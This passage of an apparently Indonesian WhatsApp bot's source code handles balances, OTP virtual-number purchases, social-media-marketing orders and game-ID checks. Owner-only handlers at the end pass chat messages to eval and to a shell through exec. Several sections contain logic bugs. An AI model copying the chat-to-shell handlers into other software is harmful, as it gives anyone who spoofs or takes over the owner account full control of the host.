  		allUserData.forEach((data) => {
  			const id = data.id.split("@")[0];
  			const saldo = parseFloat(data.saldo);
  			if (!userSaldoSummary[id]) {
  				userSaldoSummary[id] = {
  					totalSaldo: 0,
  				};
  			}
  			userSaldoSummary[id].totalSaldo += saldo;
  			totalSaldoSemuaPengguna += saldo;
  		});
  		let replyMessage = `*[ REKAP SALDO MEMBER ]*\n\n`;
  		replyMessage += `*TOTAL SALDO SEMUA PENGUNA: Rp ${totalSaldoSemuaPengguna
  			.toFixed(2)
  			.replace(/\d(?=(\d{3})+\.)/g, "$&,")}\n\n`;
  			for (const id in userSaldoSummary) {
  				replyMessage += `*ID Pengguna: ${id}*\n`;
  				replyMessage +=
  				"```" +
  				`Total Saldo: Rp ${userSaldoSummary[id].totalSaldo
  					.toFixed(2)
  					.replace(/\d(?=(\d{3})+\.)/g, "$&,")}\n` +
  					"```";
  					replyMessage += "====================\n\n";
  				}

  				reply(replyMessage);
  			} catch (error) {
  				console.error("Error reading the user data file:", error);
  				reply("Error, Tidak dapat membaca data");
  			}

  			break;
  		}

  		case "rekaptrx": {
  			if (!isOwner) return;

  			const filePath = "./Pengaturan/database/datatrx.json";

  			try {
  				const fileData = fs.readFileSync(filePath, "utf8");
  				const allTransactions = JSON.parse(fileData);

  				if (allTransactions.length === 0) {
  					return reply("Tidak Ditemukan Data Transaksi");
  				}

  				const monthlyTransactionSummary = {};
  				allTransactions.forEach((data) => {
  					const transactionDate = moment(data.date);
  					const transactionMonth = transactionDate.format("MMMM");

  					if (!monthlyTransactionSummary[transactionMonth]) {
  						monthlyTransactionSummary[transactionMonth] = {
  							totalTransactions: 0,
  							totalHarga: 0,
  							totalHargaModal: 0,
  							totalProfit: 0,
  						};
  					}

  					monthlyTransactionSummary[transactionMonth].totalTransactions += 1;
  					monthlyTransactionSummary[transactionMonth].totalHarga +=
  					parseFloat(data.harga);
  					monthlyTransactionSummary[transactionMonth].totalHargaModal +=
  					parseFloat(data.harga_modal);

  					const profit =
  					parseFloat(data.harga) - parseFloat(data.harga_modal);
  					monthlyTransactionSummary[transactionMonth].totalProfit += profit;
  				});

  				let replyMessage = `*[ REKAP TRANSAKSI BULANAN ]*\n\n`;
  				Object.keys(monthlyTransactionSummary).forEach((month) => {
  					const summary = monthlyTransactionSummary[month];
  					const formattedTotalHarga = new Intl.NumberFormat("id-ID", {
  						style: "currency",
  						currency: "IDR",
  					}).format(summary.totalHarga);
  					const formattedTotalHargaModal = new Intl.NumberFormat("id-ID", {
  						style: "currency",
  						currency: "IDR",
  					}).format(summary.totalHargaModal);
  					const formattedTotalProfit = new Intl.NumberFormat("id-ID", {
  						style: "currency",
  						currency: "IDR",
  					}).format(summary.totalProfit);

  					replyMessage += `*Bulan ${month}*\n`;
  					replyMessage += `Total Transaksi: ${summary.totalTransactions}\n`;
  					replyMessage += `Omset: ${formattedTotalHarga}\n`;
  					replyMessage += `Modal: ${formattedTotalHargaModal}\n`;
  					replyMessage += `Profit: ${formattedTotalProfit}\n\n`;
  				});

  				reply(replyMessage);
  			} catch (error) {
  				console.error("Error reading the transaction history file:", error);
  				reply("Error, Tidak dapat membaca data");
  			}
  			break;
  		}
  		case "listdeposit": {
  			const filePath = "./Pengaturan/database/datadepo.json";

  			try {
  				const fileData = fs.readFileSync(filePath, "utf8");
  				const allUserData = JSON.parse(fileData);

  				const userData = allUserData.filter(
  					(data) => data.buyer === m.sender
  					);

  				if (userData.length === 0) {
  					return reply(
  						"Kamu belum memiliki riwayat transaksi. Jika ingin melakukan transaksi silahkan ketik .menu"
  						);
  				}

  				let totalHarga = 0;
  				let totalTransactions = userData.length;

  				userData.forEach((data) => {
  					totalHarga += parseFloat(data.saldo_diterima);
  				});

  				const historyText = userData.map((data, index) => {
  					const formattedHarga = new Intl.NumberFormat("id-ID", {
  						style: "currency",
  						currency: "IDR",
  					}).format(data.harga);

  					return `_*#Deposit Ke-${index + 1}:*_
  					*› Status:* ${data.status}
  					*› Reff ID:* ${data.ref_id}
  					*› Waktu:* ${data.date}
  					*› Total Bayar :* ${formatmoney(data.total_bayar)}
  					*› Saldo Diterima:* _${formatmoney(data.saldo_diterima)}_\n`;
  				});

  				const formattedTotalHarga = new Intl.NumberFormat("id-ID", {
  					style: "currency",
  					currency: "IDR",
  				}).format(totalHarga);

  				const replyMessage = `*[ RIWAYAT DEPOSIT ]*

  				*Total DEPOSIT:* ${totalTransactions}
  				*Jumlah DEPOSIT:* ${formattedTotalHarga}

  				${historyText.join("\n")}`;

  				reply(replyMessage);
  			} catch (error) {
  				console.error("Error reading the transaction history file:", error);
  				reply("Ada Masalah ketika membaca data, silahkan hubungi owner.");
  			}
  			break;
  		}
  		case "upgrade": {
        const rol = args[0].toUpperCase(); // Mengonversi role menjadi huruf besar
        if (!rol)
        	return reply(
        		"Role yang diinginkan tidak ditemukan. Contoh: #upgrade VIP"
        		);
        const currentRole = cek("role", m.sender).toUpperCase(); // Mendapatkan peran saat ini pengguna

        if (rol === "VIP") {
        	if (currentRole === "VIP" && rol === "VIP")
        		return reply("Role Anda sudah VVIP.");
        	if (30000 > cek("saldo", m.sender))
        		return reply(
        			`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VIP. Silakan deposit terlebih dahulu.`
        			);

        	reply("Proses upgrade...");
        	sett("-saldo", m.sender, 30000);
        	await sleep(1500);
        	sett("role", m.sender, "VIP");
        	reply(
        		`Selamat, peran Anda sekarang menjadi ${cek("role", m.sender)}`
        		);
        } else if (rol === "VVIP") {
        	if (currentRole === "VVIP" && rol === "VVIP")
        		return reply("Role Anda sudah VVIP.");
        	if (60000 > cek("saldo", m.sender))
        		return reply(
        			`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VVIP. Silakan deposit terlebih dahulu.`
        			);

        	reply("Proses upgrade...");
        	sett("-saldo", m.sender, 60000);
        	sett("role", m.sender, "VVIP");
        	await sleep(1500);

        	reply(
        		`Selamat, peran Anda sekarang menjadi ${cek("role", m.sender)}.`
        		);
        } else {
        	reply("Peran yang diminta tidak valid.");
        }
        break;
    }
    case "upgradee": {
        const rol = args[0].toUpperCase(); // Mengonversi role menjadi huruf besar
        if (!rol)
        	return reply(
        		"Role yang diinginkan tidak ditemukan. Contoh: #upgrade VIP"
        		);
        const currentRole = cek("level", m.sender).toUpperCase(); // Mendapatkan peran saat ini pengguna

        if (rol == "platinum") {
        	if (currentRole == "platinum" && rol == "platinum")
        		return reply("Role Anda sudah PARTNER.");
        	if (30000 > cek("saldo", m.sender))
        		return reply(
        			`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VIP. Silakan deposit terlebih dahulu.`
        			);

        	reply("Proses upgrade...");
        	sett("-saldo", m.sender, 30000);
        	await sleep(1500);
        	sett("level", m.sender, "partner");
        	reply(
        		`Selamat, peran Anda sekarang menjadi ${cek("role", m.sender)}`
        		);
        } else if (rol === "gold") {
        	if (currentRole === "gold" && rol === "gold")
        		return reply("Role Anda sudah GOLD.");
        	if (60000 > cek("saldo", m.sender))
        		return reply(
        			`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VVIP. Silakan deposit terlebih dahulu.`
        			);

        	reply("Proses upgrade...");
        	sett("-saldo", m.sender, 60000);
        	sett("level", m.sender, "gold");
        	await sleep(1500);

        	reply(
        		`Selamat, peran Anda sekarang menjadi ${cek("level", m.sender)}.`
        		);
        } else {
        	reply("Peran yang diminta tidak valid.");
        }
        break;
    }

    case "listotp":
    {
    	const io = text.split(" ")[0];
    	if (!io)
    		return reply("Format #listotp [kode negara]\nContoh #listotp 12");

    	for (let i of list_negara) {
    		if (i.id == io) {
    			try {
    				let tt_res = await fetchJson(
    					`https://otpweb.net/api?api_key=${apiotp}&action=get_service&country_id=${io}`
    					);

    				if (tt_res.status === true) {
    					const data = tt_res.data;

                  // Check if data is an array before iterating over it
                  if (Array.isArray(data)) {
                  	data.sort((a, b) => a.cost - b.cost);

                  	let lov = `🔍 *DAFTAR HARGA OTP ${i.name}*\n\n`;

                  	data.forEach((service) => {
                  		let cleanedString = service.cost
                  		.toString()
                  		.replace(/[^\d,]/g, "");
                  		let ss = parseFloat(cleanedString.replace(/,/g, ""));

                  		lov += `> *Id:* ${service.service_id}\n`;
                  		lov += `> *Nama:* ${service.service_name}\n`;
                  		lov += `> *Harga:* ${formatmoney(ss)}\n`;
                  		lov += `> *Stok:* ${service.count}\n\n`;
                  	});

                    // Simpan data ke file JSON dengan nama negara
                    const fileName = `./Pengaturan/database/otpweb/${io}_otp.json`;
                    fs.writeFileSync(fileName, JSON.stringify(data));

                    reply(lov);
                } else {
                	reply(
                		"Data yang diterima tidak valid. Silakan coba lagi nanti."
                		);
                }
            } else {
            	reply(`Error: ${tt_res.message}`);
            }
        } catch (error) {
        	console.error(error);
        	reply(
        		"Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
        		);
        }
        break;
    }
}
}
break;

case "cekml": {
	const [id, zone] = text.split(' ');
	if (!id || !zone) {
		return reply("```Tolong isi format yang benar: cekml [id] [zone]```\n\n```cekml 2400627355 7263```");
	}
	getGameData('https://cek-id-game.vercel.app/api/game/mobile-legends', { id, zone });
	break;
}

case "cekff": {

	const [id] = text.split(' ');
	if (!id) {
		return reply("```Tolong isi format yang benar: cekff [id]```\n\n```cekff 2400627355```");
	}
	getGameData('https://cek-id-game.vercel.app/api/game/free-fire', { id });
	break;
}

case "cekhd": {

	const [id] = text.split(' ');
	if (!id) {
		return reply("```Tolong isi format yang benar: cekhd [id]```\n\n```cekhd 2400627355```");
	}
	getGameData('https://cek-id-game.vercel.app/api/game/higgs-domino', { id });
	break;
}


case "profileotp":
{
	if (!isOwner) return reply(mess.owner);
	let kode = await fetchJson(
		`${global.domainotp}/get-profile/${otpapi}`
		);
	if (kode.succes == false) return reply(kode.data.messages);
	let res = kode.data;
	let teks = `*GET PROFILE*
	》 Username: ${res.data.username}
	》 Saldo: RP. ${res.data.saldo},
	》 Email: ${res.data.email}`;
	reply(teks);
}
break;
case "akunotpweb":
{
	var tt_res = await fetchJson(
		`${global.domainotp}/get-profile/${otpapi}`
		);
	if (tt_res.status === true) {
		const data = tt_res.data;
		var lov = `🔍 *CEK SALDO OTPWEB*

		📊 𝗦𝗔𝗟𝗗𝗢 *OTPWEB*:
		Username : ${tt_res.data.username}
		➥ 𝗦𝗔𝗟𝗗𝗢 𝗦𝗘𝗥𝗩𝗘𝗥: ${formatmoney(tt_res.data.saldo)}
		》 Email: ${tt_res.data.email}`;

		reply(lov);
	}
	if (tt_res.status === false) {
		reply(tt_res.messages);
	}
}

break;
case "setstatus": {
	if (cek("id", m.sender) == null)
		return reply(
			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
			);
	if (
		!fs.existsSync(
			`./Pengaturan/database/riwayat/trx/${m.sender.split("@")[0]}.json`
			)
		)
		return reply("Anda Belum Melakukan pemesan otp");
	const order_id = text.split(" ")[0];
        const status = text.split(" ")[1]; // Mengambil status dari pesan
        if (!order_id || !status)
        	return reply("contoh #setstatus orderid cancel");
        let data_otpweb = JSON.parse(
        	fs.readFileSync(PathAut + sender.split("@")[0] + ".json")
        	);
        const hr = Number(data_otpweb.harga);
        // Memastikan status yang diterima adalah salah satu dari "cancel", "retry", atau "done"
        if (status !== "cancel" && status !== "retry" && status !== "done") {
        	return reply(
        		"Status yang dimasukkan tidak valid. Mohon masukkan 'cancel', 'retry', atau 'done'."
        		);
        }

        try {
        	const tt_res = await fetchJson(
        		`https://otpweb.net/api?api_key=${apiotp}&action=set_status&order_id=${order_id}&status=${status}`
        		);
        	const dta = tt_res.data;
        	if (tt_res.status === true) {
        		if (dta.status === "cancel") {
        			reply(`*Berhasil Membatalkan Order*`);
        			sett("+saldo", m.sender, hr);
        			fs.unlinkSync(PathOtp + m.sender.split("@")[0] + ".json");
        		} else if (status === "retry") {
              // Menangani kasus "retry"
              reply(`*Berhasil Mengirim Kode`);
          } else if (status === "done") {
              // Menangani kasus "done"
              reply(`*Order Selesai`);
          }
      } else {
      	reply(`${tt_res.messages}`);
      }
          // Mengirim tanggapan
      } catch (error) {
      	console.error(error);
      	reply(
      		"Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
      		);
      }
      break;
  }
  case "statusotp":
  {
  	if (cek("id", m.sender) == null)
  		return reply(
  			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
  			);
  	if (
  		!fs.existsSync(
  			`./Pengaturan/database/riwayat/trx/${m.sender.split("@")[0]}.json`
  			)
  		)
  		return reply("Anda Belum Melakukan pemesanan otp");

  	const ord = text.split(" ")[0];
  	if (!ord) return reply("contoh #statusotp orderid");
  	try {
  		const tt_res = await fetchJson(
  			`https://otpweb.net/api?api_key=${apiotp}&action=get_status&order_id=${ord}`
  			);
  		if (tt_res.status === true) {
  			const data = tt_res.data;
  			if (data.status === "done") {
  				let lov = `*Detail Pembelian*\n\n`;
  				lov += `> *Order ID:* ${data.order_id}\n`;
  				lov += `> *Number:* ${data.number}\n`;
  				lov += `> *Status:* ${data.status}\n\n`;
  				lov += `> *SMS:* ${data.SMS}\n\n`;
  				lov += `Jika ingin mengirimkan ulang sms silahkan ketik #setstatus orderid retry\n`;
  				reply(lov);
  			}
  			if (data.status === "waiting") {
  				let lov = `*==== CEK STATUS ====*\n\n`;
  				lov += `> *Order ID:* ${data.order_id}\n`;
  				lov += `> *Number:* ${data.number}\n`;
  				lov += `> *Status:* ${data.status}\n\n`;
  				lov += `Jika Membatalkan Pembelian Silahkan ketik #setstatus orderid cancel\n`;
  				reply(lov);
  			}
  		} else {
  			reply(`Errot: ${tt_res.messages}`);
  		}
  	} catch (error) {
  		console.error(error);
  		reply(
  			"Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
  			);
  	}
          break; // Menghentikan loop setelah menemukan layanan dengan id yang sesuai
      }
      break;
      case "getorder":
      {
      	if (!isOwner) return reply(mess.owner);
      	if (!q) return reply(teks_format2);
      	var res = await fetchJson(
      		`${global.domainotp}/set-orders/${apikeyotp}/${q}`
      		);
      	if (res.success == false) return reply(res.data.messages);
      	reply(res.data.message);
      	await sleep(1000);
      	let ress = res.data.data;
      	reply(
      		`> • Berikut Detail Orderan Anda\n\n` +
      		`- order_id: ${ress.order_id}\n` +
      		`- aplikasi_id: ${ress.aplikasi_id}\n` +
      		`- number: ${ress.number}\n` +
      		`- status: ${ress.status}\n` +
      		`- sms: ${ress.sms}\n` +
      		`- status_sms: ${ress.status_sms}\n` +
      		`- price: Rp${ress.price}\n` +
      		`- last_saldo: Rp${formatmoney(ress.last_saldo)}\n` +
      		`- created_at: ${ress.created_at}\n` +
      		`- last_sms: ${ress.last_sms}\n` +
      		`- aplikasi_name: ${ress.aplikasi_name}`
      		);
      }
      break;
      case "sms":
      {
      	if (!isOwner) return reply(mess.owner);
      	if (!q) return reply(`id yah mana?`);
      	var res = await fetchJson(
      		`${global.domainotp}/set-orders/${otpapi}/${q}`
      		);
      	if (res.success == false) return reply(res.data.messages);
      	await sleep(1000);
      	let ress = res.data.data;
      	reply(`*── 「 DETAIL RIWAYAT 」 ──*

      		_》 order id: ${ress.order_id}_
      		_》 aplikasi id: ${ress.aplikasi_id}_
      		_》 number: ${ress.number}_
      		_》 status: ${ress.status}_
      		_》 created at: ${ress.created_at}_
      		_》 apk name: ${ress.aplikasi_name}_`);
      }
      break;
      case "cancelsms":
      if (!isOwner) return reply(mess.owner);
      if (!fs.existsSync(`./database/nokos/${sender}.json`))
      	return reply("Kamu tidak melakukan pembelian");
      fs.unlinkSync(`./database/nokos/${sender}.json`);
      reply("Sukses");
      break;
      case "cancel-otp":
      {
      	if (!isOwner) return reply(mess.owner);
      	if (!q) return reply(`id yah mana?`);
      	var res = await fetchJson(
      		`${global.domainotp}/cancle-orders/${apikeyotp}/${q}`
      		);
      	if (res.success == false) return reply(res.data.messages);
      	await sleep(1000);
      	let ress = res.data.data;
      	reply(`*── 「 CANCEL BERHASIL 」 ──*

      		_》 id: ${q}_
      		_》 status : sukses cancel_
      		`);
      }
      break;
      case "orderotp":
      {
      	if (!isOwner) return reply(mess.owner);
      	if (!q) return reply(teks_format);
      	var res = await fetchJson(
      		`${global.domainotp}/set-orders/${apikeyotp}/${q}`
      		);
      	if (res.success == false) return reply(res.data.messages);
      	reply(res.data.message);
      	await sleep(1000);
      	let ress = res.data.data;
      	reply(
      		`*Berikut Detail Orderan Anda*\n\n` +
      		`- order_id: ${ress.order_id}\n` +
      		`- aplikasi_id: ${ress.aplikasi_id}\n` +
      		`- number: ${ress.number}\n` +
      		`- status: ${ress.status}\n` +
      		`- sms: ${ress.sms}\n` +
      		`- status_sms: ${ress.status_sms}\n` +
      		`- price: Rp${ress.price}\n` +
      		`- last_saldo: Rp${formatmoney(ress.last_saldo)}\n` +
      		`- created_at: ${ress.created_at}\n` +
      		`- last_sms: ${ress.last_sms}\n` +
      		`- aplikasi_name: ${ress.aplikasi_name}\n\n` +
      		`• info selengkapnya\n` +
      		`silahkan ketik .getorder`
      		);

      }
      break;
      case "buyotp":
      {
      	if (
      		!fs.existsSync(
      			`./Pengaturan/database/riwayat/trx/${m.sender.split("@")[0]}.json`
      			)
      		)
      		return reply("Anda Belum Melakukan pemesan otp");
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);
      	const idne = text.split("|")[0];
      	const idp = text.split("|")[1];
      	if (!idne || !idp)
      		return reply(
      			"format #buyotp [kode negara]|[kode produk]\nContoh : #buyotp 6|wa"
      			);
      	orderwebotp(idne, idp);
      }
      break;
      case "buysmm":
      {
      	if (
      		!fs.existsSync(
      			`./Pengaturan/database/riwayat/trx/${m.sender.split("@")[0]}.json`
      			)
      		)
      		return reply("Anda Belum Melakukan pemesan otp");
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);
      	const idnei = text.split("|")[0];
      	const idpi = text.split("|")[1];
      	const idsi = text.split("|")[2];
      	if (!idnei || !idpi || !idsi)
      		return reply(
      			"format #buyotp [kode negara]|[kode produk]\nContoh : #buyotp 6|wa"
      			);
      	ordersmm(idnei, idpi, idsi);
      }
      break;
      case "lanjutkan": {
      	let kode_buyer = cek("service", m.sender);
      	let jumlahh = cek("jumlah", m.sender);

      	for (let i of sos) {
      		if (i.id == kode_buyer) {
      			let tujuann = cek("tujuan", m.sender);
      			let harga = cek("price", m.sender);
      			let referdf = cek("reff", m.sender);
      			let ref_no = m.sender.split("@")[0];
      			let namaproduk = cek("product_name", m.sender);

      			const apiURL = "https://irvankedesmm.co.id/api/order";
      			const params = new URLSearchParams({
      				api_id: idsmm,
      				api_key: smm,
      				service: kode_buyer,
      				target: tujuann,
      				quantity: jumlahh,
      			});

      			fetch(apiURL, {
      				method: "POST",
      				body: params,
      				headers: {
      					"Content-Type": "application/x-www-form-urlencoded",
      				},
      			})
      			.then(async (response) => {
      				const responseData = await response.json();

      				if (response.status == 200 && responseData.status == true) {
      					const id = responseData.data.id;
      					const jumlahnya = responseData.data.quantity;

      					m.reply(
      						`*「 Sosmed Berhasil DiProses 」*\n\nReffID : ${id}\nLayanan : ${namaproduk}\nJumlah : ${jumlahh}\nTujuan : ${tujuann}\n\nSimpan Kode ReffIDnya : *${id}* Untuk Mengecek Status Secara Berkala\nKetik : *ceksosmed ${id}*`
      						);
                  // Mengatur ulang data pengguna setelah berhasil
                  sett("product_name", m.sender, "");
                  sett("price", m.sender, 0);
                  sett("tujuan", m.sender, "");
                  sett("desc", m.sender, "");
                  sett("reff", m.sender, "");
                  sett("jumlah", m.sender, "");
                  sett("buyer_sku_code", m.sender, "");
                  sett("status_topup", m.sender, true);
                  sett("status_sosmed", m.sender, true);
              } else {
                  sett("+saldo", m.sender, parseFloat(harga)); // Mengembalikan saldo
                  m.reply(`Gagal Memproses Orderan Sosmed ReffID ${referdf}`);
                  // Mengatur ulang data pengguna setelah gagal
                  sett("product_name", m.sender, "");
                  sett("price", m.sender, 0);
                  sett("tujuan", m.sender, "");
                  sett("desc", m.sender, "");
                  sett("reff", m.sender, "");
                  sett("jumlah", m.sender, "");
                  sett("buyer_sku_code", m.sender, "");
                  sett("status_topup", m.sender, true);
                  sett("status_sosmed", m.sender, true);
              }
          })
      			.catch((error) => {
      				console.error("Error during transaction:", error);
                sett("+saldo", m.sender, parseFloat(harga)); // Mengembalikan saldo
                m.reply(
                	"Gagal, Terjadi Kesalahan Saat Memproses Transaksi. Silakan Coba Lagi."
                	);
                // Mengatur ulang data pengguna setelah gagal
                sett("product_name", m.sender, "");
                sett("price", m.sender, 0);
                sett("tujuan", m.sender, "");
                sett("desc", m.sender, "");
                sett("reff", m.sender, "");
                sett("jumlah", m.sender, "");
                sett("buyer_sku_code", m.sender, "");
                sett("status_topup", m.sender, true);
                sett("status_sosmed", m.sender, true);
            });
            break; // Keluar dari loop setelah menemukan produk
        }
    }
    break;
}
case "y":
{
	if (cek("id", m.sender) == null)
		return reply(
			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
			);
	if (
		!fs.existsSync(
			`./Pengaturan/database/riwayat/trx/${m.sender.split("@")[0]}.json`
			)
		)
		return reply("Anda Belum Melakukan pemesanan otp");
	let data_depo = JSON.parse(
		fs.readFileSync(PathAut + sender.split("@")[0] + ".json")
		);
	const kod = data_depo.service_id;
	const nga = data_depo.negara_id;
	try {
		const tt_res = await fetchJson(
			`https://otpweb.net/api?api_key=${apiotp}&action=get_number&country_id=${nga}&service_id=${kod}&operator=`
			);

		const data = tt_res.data;
		if (tt_res.status === true) {
			let lov = `*Detail Pembelian*\n\n`;
			lov += `> *Order ID:* ${data.order_id}\n`;
			lov += `> *Number:* ${data.number}\n`;
			lov += `> *Harga:* ${data.harga}\n`;
			lov += `> *Status:* ${data.status}\n\n`;
			lov += `> _*Jika kamu sudah meminta kode sms silahkan ketik #statusotp*_`;
			reply(lov);
		} else {
			reply(`Error: ${tt_res.messages}`);
		}
	} catch (error) {
		console.log(error);
		reply(
			"Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
			);
	}
          break; // Menghentikan loop setelah menemukan layanan dengan id yang sesuai
      }
      break;

      case "kodenegara":
      {
      	var tt_res = await fetchJson(
      		`https://otpweb.net/api?api_key=${global.apiotp}&action=country`
      		);

      	if (tt_res.status === true) {
      		const data = tt_res.data;
      		data.sort((a, b) => a.id - b.id);

      		var lov = `*DAFTAR OTP NEGARA*\n\n`;

      		data.forEach((service) => {
      			lov += `> *KODE NEGARA:* ${service.id}\n`;
      			lov += `> *NAMA:* ${service.name}\n\n`;
      		});

      		fs.writeFileSync(
      			"./Pengaturan/database/otpweb/negara.json",
      			JSON.stringify(data)
      			);
      		reply(lov);
      	} else {
      		reply(`Error: ${tt_res.message}`);
      	}
      }
      break;

      case "listotp":
      {
      	var tt_res = await fetchJson(
      		`https://otpweb.net/api?api_key=${apiotp}&action=get_service&country_id=12`
      		);

      	if (tt_res.status === true) {
      		const data = tt_res.data;
      		data.sort((a, b) => a.cost - b.cost);

      		var lov = `🔍 *SERVICE SPESIAL NUMBER*\n\n`;

      		data.forEach((service) => {
      			let cleanedString = service.cost
      			.toString()
      			.replace(/[^\d,]/g, "");
      			let ss = parseFloat(cleanedString.replace(/,/g, ""));

      			lov += `> *ID:* ${service.service_id}\n`;
      			lov += `> *NAMA:* ${service.service_name}\n`;
      			lov += `> *HARGA:* ${formatmoney(ss)}\n\n`;
      		});

      		fs.writeFileSync(
      			"./Pengaturan/database/otpweb/layanan_otp.json",
      			JSON.stringify(data)
      			);
      		reply(lov);
      	} else {
      		reply(`Error: ${tt_res.message}`);
      	}
      }
      break;

      default:
      if (budy.startsWith("<")) {
      	if (!isOwner) return;
      	try {
      		return reply(JSON.stringify(eval(`${args.join(" ")}`), null, "\t"));
      	} catch (e) {
      		reply(e);
      	}
      }

      if (budy.startsWith("vv")) {
      	if (!isOwner) return;
      	try {
      		let evaled = await eval(budy.slice(2));
      		if (typeof evaled !== "string")
      			evaled = require("util").inspect(evaled);
      		await reply(evaled);
      	} catch (err) {
      		reply(String(err));
      	}
      }

      if (budy.startsWith("uu")) {
      	if (!isOwner) return;
      	qur = budy.slice(2);
      	exec(qur, (err, stdout) => {
      		if (err) return reply(`${err}`);
      		if (stdout) {
      			reply(stdout);
      		}
      	});
      }

      if (isCmd && budy.toLowerCase() != undefined) {
      	if (m.chat.endsWith("broadcast")) return;
      	if (m.isBaileys) return;
      	let msgs = global.db.database;
      	if (!(budy.toLowerCase() in msgs)) return;
      	kris.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
      }
  }
} catch (err) {
	console.log(util.format(err));
	let e = String(err);
	kris.sendMessage("6281317107885@s.whatsapp.net", {
		text: "assalamualaikum Owner Ada Fitur Yang Eror Nih " + util.format(e),
		contextInfo: {
			forwardingScore: 5,
			isForwarded: true,
		},
	});
}
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(chalk.redBright(`Update'${__filename}'`));
	delete require.cache[file];
	require(file);
});
